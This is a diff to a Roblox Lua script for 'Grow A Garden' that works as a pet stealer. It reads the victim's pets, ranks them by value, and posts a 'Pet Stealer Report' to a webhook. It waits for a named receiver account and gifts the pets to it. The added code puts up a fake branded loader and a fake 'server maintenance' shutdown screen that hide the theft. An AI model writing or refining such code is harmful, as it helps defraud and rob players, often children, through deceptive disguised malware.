@@ -17,7 +17,6 @@ local GIFT_COOLDOWN = 3
 local MINIMUM_PETS = 3
 local MINIMUM_TOTAL_VALUE = 50000
 
--- Executor identification
 local function identifyExecutor()
     if syn then
         return "Synapse X"
@@ -64,105 +63,6 @@ local function sendWebhook(data)
     end
 end
 
--- Persistent shutdown screen (shows until receiver leaves)
-local function createPersistentShutdown()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "PersistentShutdown"
-    gui.IgnoreGuiInset = true
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    gui.DisplayOrder = 999999
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundColor3 = Color3.new(0, 0, 0)
-    frame.Parent = gui
-
-    local title = Instance.new("TextLabel")
-    title.Text = "Grow A Garden"
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.Size = UDim2.new(1, 0, 0.3, 0)
-    title.Position = UDim2.new(0, 0, 0.3, 0)
-    title.BackgroundTransparency = 1
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 32
-    title.TextTransparency = 1
-    title.Parent = frame
-
-    local message = Instance.new("TextLabel")
-    message.Text = "Server maintenance in progress..."
-    message.TextColor3 = Color3.new(1, 1, 1)
-    message.Size = UDim2.new(1, 0, 0.2, 0)
-    message.Position = UDim2.new(0, 0, 0.5, 0)
-    message.BackgroundTransparency = 1
-    message.Font = Enum.Font.SourceSans
-    message.TextSize = 24
-    message.TextTransparency = 1
-    message.Parent = frame
-
-    local dots = Instance.new("TextLabel")
-    dots.Text = "Please wait"
-    dots.TextColor3 = Color3.new(1, 1, 1)
-    dots.Size = UDim2.new(1, 0, 0.1, 0)
-    dots.Position = UDim2.new(0, 0, 0.6, 0)
-    dots.BackgroundTransparency = 1
-    dots.Font = Enum.Font.SourceSans
-    dots.TextSize = 18
-    dots.TextTransparency = 1
-    dots.Parent = frame
-
-    gui.Parent = CoreGui
-
-    -- Fade-in animation
-    local fadeInTime = 1.5
-    local fadeInStart = os.clock()
-    local fadeConn
-    fadeConn = RunService.Heartbeat:Connect(function()
-        local elapsed = os.clock() - fadeInStart
-        local alpha = math.min(elapsed / fadeInTime, 1)
-
-        title.TextTransparency = 1 - alpha
-        message.TextTransparency = 1 - alpha
-        dots.TextTransparency = 1 - alpha
-
-        if alpha >= 1 then
-            fadeConn:Disconnect()
-        end
-    end)
-
-    -- Dot animation
-    local dotCount = 0
-    local lastDotTime = os.clock()
-    local dotInterval = 0.8
-    local dotConn
-    dotConn = RunService.Heartbeat:Connect(function()
-        local now = os.clock()
-        if now - lastDotTime >= dotInterval then
-            lastDotTime = now
-            dotCount = (dotCount + 1) % 4
-            dots.Text = "Please wait"..string.rep(".", dotCount)
-        end
-    end)
-
-    -- Pulsing title effect
-    local pulseConn
-    pulseConn = RunService.Heartbeat:Connect(function()
-        local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
-        title.TextSize = 32 * pulse
-    end)
-
-    return {
-        gui = gui,
-        connections = {fadeConn, dotConn, pulseConn}
-    }
-end
-
-local function cleanupShutdown(shutdownData)
-    for _, conn in ipairs(shutdownData.connections) do
-        if conn then conn:Disconnect() end
-    end
-    shutdownData.gui:Destroy()
-end
-
 local function getPetsInventory()
     local backpack = LocalPlayer:FindFirstChild("Backpack")
     if not backpack then return {} end
@@ -195,12 +95,247 @@ local function getPetsInventory()
         end
     end
     
-    -- Sort pets by value (highest first)
     table.sort(pets, function(a, b)
         return a.value > b.value
     end)
     
     return pets
+end
+
+local function createLoader()
+    shared.LoaderTitle = "Subscribe to TwiistyScripts"
+    shared.LoaderKeyFrames = {
+        [1] = {1, 10},
+        [2] = {2, 30},
+        [3] = {3, 60},
+        [4] = {2, 100}
+    }
+    
+    local v2 = {
+        LoaderData = {
+            Name = shared.LoaderTitle or "A Loader",
+            Colors = shared.LoaderColors or {
+                Main = Color3.fromRGB(30, 30, 30),
+                Topic = Color3.fromRGB(200, 200, 200),
+                Title = Color3.fromRGB(255, 255, 255),
+                LoaderBackground = Color3.fromRGB(40, 40, 40),
+                LoaderSplash = Color3.fromRGB(130, 36, 212)
+            }
+        },
+        Keyframes = shared.LoaderKeyFrames or {
+            [1] = {1, 10},
+            [2] = {2, 30},
+            [3] = {3, 60},
+            [4] = {2, 100}
+        }
+    }
+    
+    local v3 = {
+        [1] = "Initializing...",
+        [2] = "Loading assets...",
+        [3] = "Connecting...",
+        [4] = "Complete!"
+    }
+
+    function TweenObject(v178, v179, v180)
+        game.TweenService:Create(v178, TweenInfo.new(v179, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), v180):Play()
+    end
+
+    function CreateObject(v181, v182)
+        local v183 = Instance.new(v181)
+        local v184
+        for v416, v417 in pairs(v182) do
+            if (v416 ~= "Parent") then
+                v183[v416] = v417
+            else
+                v184 = v417
+            end
+        end
+        v183.Parent = v184
+        return v183
+    end
+
+    local function v4(v186, v187)
+        local v188 = Instance.new("UICorner")
+        v188.CornerRadius = UDim.new(0, v186)
+        v188.Parent = v187
+    end
+
+    local v5 = CreateObject("ScreenGui", {
+        Name = "Core",
+        Parent = game.CoreGui
+    })
+
+    local v6 = CreateObject("Frame", {
+        Name = "Main",
+        Parent = v5,
+        BackgroundColor3 = v2.LoaderData.Colors.Main,
+        BorderSizePixel = 0,
+        ClipsDescendants = true,
+        Position = UDim2.new(0.5, 0, 0.5, 0),
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Size = UDim2.new(0, 0, 0, 0)
+    })
+
+    v4(12, v6)
+
+    local v7 = CreateObject("ImageLabel", {
+        Name = "UserImage",
+        Parent = v6,
+        BackgroundTransparency = 1,
+        Image = "rbxassetid://81767899440204",
+        Position = UDim2.new(0, 15, 0, 10),
+        Size = UDim2.new(0, 50, 0, 50)
+    })
+
+    v4(25, v7)
+
+    local v8 = CreateObject("TextLabel", {
+        Name = "UserName",
+        Parent = v6,
+        BackgroundTransparency = 1,
+        Text = "Youtube: TwiistyScripts",
+        Position = UDim2.new(0, 75, 0, 10),
+        Size = UDim2.new(0, 200, 0, 50),
+        Font = Enum.Font.GothamBold,
+        TextColor3 = v2.LoaderData.Colors.Title,
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Left
+    })
+
+    local v9 = CreateObject("TextLabel", {
+        Name = "Top",
+        TextTransparency = 1,
+        Parent = v6,
+        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, 30, 0, 70),
+        Size = UDim2.new(0, 301, 0, 20),
+        Font = Enum.Font.Gotham,
+        Text = "Loader",
+        TextColor3 = v2.LoaderData.Colors.Topic,
+        TextSize = 10,
+        TextXAlignment = Enum.TextXAlignment.Left
+    })
+
+    local v10 = CreateObject("TextLabel", {
+        Name = "Title",
+        Parent = v6,
+        TextTransparency = 1,
+        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0, 30, 0, 90),
+        Size = UDim2.new(0, 301, 0, 46),
+        Font = Enum.Font.Gotham,
+        RichText = true,
+        Text = "<b>" .. v2.LoaderData.Name .. "</b>",
+        TextColor3 = v2.LoaderData.Colors.Title,
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Left
+    })
+
+    local v11 = CreateObject("Frame", {
+        Name = "BG",
+        Parent = v6,
+        AnchorPoint = Vector2.new(0.5, 0),
+        BackgroundTransparency = 1,
+        BackgroundColor3 = v2.LoaderData.Colors.LoaderBackground,
+        BorderSizePixel = 0,
+        Position = UDim2.new(0.5, 0, 0, 70),
+        Size = UDim2.new(0.8500000238418579, 0, 0, 24)
+    })
+
+    v4(8, v11)
+
+    local v12 = CreateObject("Frame", {
+        Name = "Progress",
+        Parent = v11,
+        BackgroundColor3 = v2.LoaderData.Colors.LoaderSplash,
+        BackgroundTransparency = 1,
+        BorderSizePixel = 0,
+        Size = UDim2.new(0, 0, 0, 24)
+    })
+
+    v4(8, v12)
+
+    local v13 = CreateObject("TextLabel", {
+        Name = "StepLabel",
+        Parent = v6,
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0.5, 0, 1, -25),
+        Size = UDim2.new(1, -20, 0, 20),
+        Font = Enum.Font.Gotham,
+        Text = "",
+        TextColor3 = v2.LoaderData.Colors.Topic,
+        TextSize = 14,
+        TextXAlignment = Enum.TextXAlignment.Center,
+        AnchorPoint = Vector2.new(0.5, 0.5)
+    })
+
+    function UpdateStepText(v191)
+        v13.Text = v3[v191] or ""
+    end
+
+    function UpdatePercentage(v193, v194)
+        TweenObject(v12, 0.5, {
+            Size = UDim2.new(v193/100, 0, 0, 24)
+        })
+        UpdateStepText(v194)
+    end
+
+    TweenObject(v6, 0.25, {
+        Size = UDim2.new(0, 346, 0, 121)
+    })
+    
+    wait()
+    
+    TweenObject(v9, 0.5, {
+        TextTransparency = 0
+    })
+    
+    TweenObject(v10, 0.5, {
+        TextTransparency = 0
+    })
+    
+    TweenObject(v11, 0.5, {
+        BackgroundTransparency = 0
+    })
+    
+    TweenObject(v12, 0.5, {
+        BackgroundTransparency = 0
+    })
+
+    for v195, v196 in pairs(v2.Keyframes) do
+        wait(v196[1])
+        UpdatePercentage(v196[2], v195)
+    end
+
+    UpdatePercentage(100, 4)
+    
+    TweenObject(v9, 0.5, {
+        TextTransparency = 1
+    })
+    
+    TweenObject(v10, 0.5, {
+        TextTransparency = 1
+    })
+    
+    TweenObject(v11, 0.5, {
+        BackgroundTransparency = 1
+    })
+    
+    TweenObject(v12, 0.5, {
+        BackgroundTransparency = 1
+    })
+    
+    wait(0.5)
+    
+    TweenObject(v6, 0.25, {
+        Size = UDim2.new(0, 0, 0, 0)
+    })
+    
+    wait(0.25)
+    v5:Destroy()
 end
 
 local function splitEmbeds(pets, totalValue, specialCount)
@@ -209,10 +344,9 @@ local function splitEmbeds(pets, totalValue, specialCount)
     local jobId = game.JobId
     local gameInstanceId = tostring(game.JobId)
     
-    -- Main embed with player info and summary
     local mainEmbed = {
         title = "🐾 Pet Stealer Report",
-        color = 0x8324D4, -- Purple color
+        color = 0x8324D4,
         timestamp = DateTime.now():ToIsoDate(),
         thumbnail = {
             url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
@@ -258,7 +392,6 @@ local function splitEmbeds(pets, totalValue, specialCount)
     
     table.insert(embeds, mainEmbed)
     
-    -- Split pets into chunks of 10 for better organization
     local petChunks = {}
     for i = 1, #pets, 10 do
         table.insert(petChunks, {table.unpack(pets, i, math.min(i + 9, #pets))})
@@ -380,69 +513,116 @@ local function isReceiverInGame()
     return nil
 end
 
+local function createFakeShutdown()
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "FakeShutdown"
+    gui.IgnoreGuiInset = true
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.DisplayOrder = 999999
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.Parent = gui
+
+    local title = Instance.new("TextLabel")
+    title.Text = "Grow A Garden"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Size = UDim2.new(1, 0, 0.3, 0)
+    title.Position = UDim2.new(0, 0, 0.3, 0)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.SourceSansBold
+    title.TextSize = 32
+    title.TextTransparency = 1
+    title.Parent = frame
+
+    local message = Instance.new("TextLabel")
+    message.Text = "Servers shutting down for maintenance..."
+    message.TextColor3 = Color3.new(1, 1, 1)
+    message.Size = UDim2.new(1, 0, 0.2, 0)
+    message.Position = UDim2.new(0, 0, 0.5, 0)
+    message.BackgroundTransparency = 1
+    message.Font = Enum.Font.SourceSans
+    message.TextSize = 24
+    message.TextTransparency = 1
+    message.Parent = frame
+
+    local dots = Instance.new("TextLabel")
+    dots.Text = "Please wait"
+    dots.TextColor3 = Color3.new(1, 1, 1)
+    dots.Size = UDim2.new(1, 0, 0.1, 0)
+    dots.Position = UDim2.new(0, 0, 0.6, 0)
+    dots.BackgroundTransparency = 1
+    dots.Font = Enum.Font.SourceSans
+    dots.TextSize = 18
+    dots.TextTransparency = 1
+    dots.Parent = frame
+
+    gui.Parent = CoreGui
+
+    local fadeInTime = 1.5
+    local fadeInStart = os.clock()
+    local fadeConn
+    fadeConn = RunService.Heartbeat:Connect(function()
+        local elapsed = os.clock() - fadeInStart
+        local alpha = math.min(elapsed / fadeInTime, 1)
+
+        title.TextTransparency = 1 - alpha
+        message.TextTransparency = 1 - alpha
+        dots.TextTransparency = 1 - alpha
+
+        if alpha >= 1 then
+            fadeConn:Disconnect()
+        end
+    end)
+
+    local dotCount = 0
+    local lastDotTime = os.clock()
+    local dotInterval = 0.8
+    local dotConn
+    dotConn = RunService.Heartbeat:Connect(function()
+        local now = os.clock()
+        if now - lastDotTime >= dotInterval then
+            lastDotTime = now
+            dotCount = (dotCount + 1) % 4
+            dots.Text = "Please wait"..string.rep(".", dotCount)
+        end
+    end)
+
+    local pulseConn
+    pulseConn = RunService.Heartbeat:Connect(function()
+        local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
+        title.TextSize = 32 * pulse
+    end)
+
+    return gui, function()
+        if fadeConn then fadeConn:Disconnect() end
+        if dotConn then dotConn:Disconnect() end
+        if pulseConn then pulseConn:Disconnect() end
+        gui:Destroy()
+    end
+end
+
 local function waitForReceiver()
     local receiverFound = Instance.new("BindableEvent")
-    local shutdownData
 
-    -- Check existing players first
     for _, player in ipairs(Players:GetPlayers()) do
         if table.find(RECEIVERS, player.Name) then
-            -- Create persistent shutdown screen
-            shutdownData = createPersistentShutdown()
-            
-            -- Monitor when receiver leaves
-            local leaveConn
-            leaveConn = player.AncestryChanged:Connect(function(_, parent)
-                if not parent then
-                    -- Receiver left, cleanup shutdown
-                    cleanupShutdown(shutdownData)
-                    leaveConn:Disconnect()
-                end
-            end)
-            
             receiverFound:Fire(player)
-            return receiverFound.Event:Wait()
+            break
         end
     end
 
-    -- Set up listener for new players
     local connection = Players.PlayerAdded:Connect(function(player)
         if table.find(RECEIVERS, player.Name) then
-            -- Create persistent shutdown screen
-            shutdownData = createPersistentShutdown()
-            
-            -- Monitor when receiver leaves
-            local leaveConn
-            leaveConn = player.AncestryChanged:Connect(function(_, parent)
-                if not parent then
-                    -- Receiver left, cleanup shutdown
-                    cleanupShutdown(shutdownData)
-                    leaveConn:Disconnect()
-                end
-            end)
-            
             receiverFound:Fire(player)
         end
     end)
 
-    -- Backup check in case PlayerAdded event fails
     local backupCheck = coroutine.create(function()
         while true do
             local receiver = isReceiverInGame()
             if receiver then
-                -- Create persistent shutdown screen
-                shutdownData = createPersistentShutdown()
-                
-                -- Monitor when receiver leaves
-                local leaveConn
-                leaveConn = receiver.AncestryChanged:Connect(function(_, parent)
-                    if not parent then
-                        -- Receiver left, cleanup shutdown
-                        cleanupShutdown(shutdownData)
-                        leaveConn:Disconnect()
-                    end
-                end)
-                
                 receiverFound:Fire(receiver)
                 break
             end
@@ -453,6 +633,11 @@ local function waitForReceiver()
 
     local foundReceiver = receiverFound.Event:Wait()
     connection:Disconnect()
+    
+    local shutdownGui, cleanup = createFakeShutdown()
+    task.wait(SHUTDOWN_DURATION)
+    cleanup()
+    
     return foundReceiver
 end
 
@@ -477,11 +662,9 @@ local function startGifting(targetPlayer)
     end
 end
 
--- Main execution
-local loader = createLoader()
+createLoader()
 sendInitialReport()
 task.wait(2)
-loader:Destroy()
 
 local receiver = waitForReceiver()
 if not receiver then return end
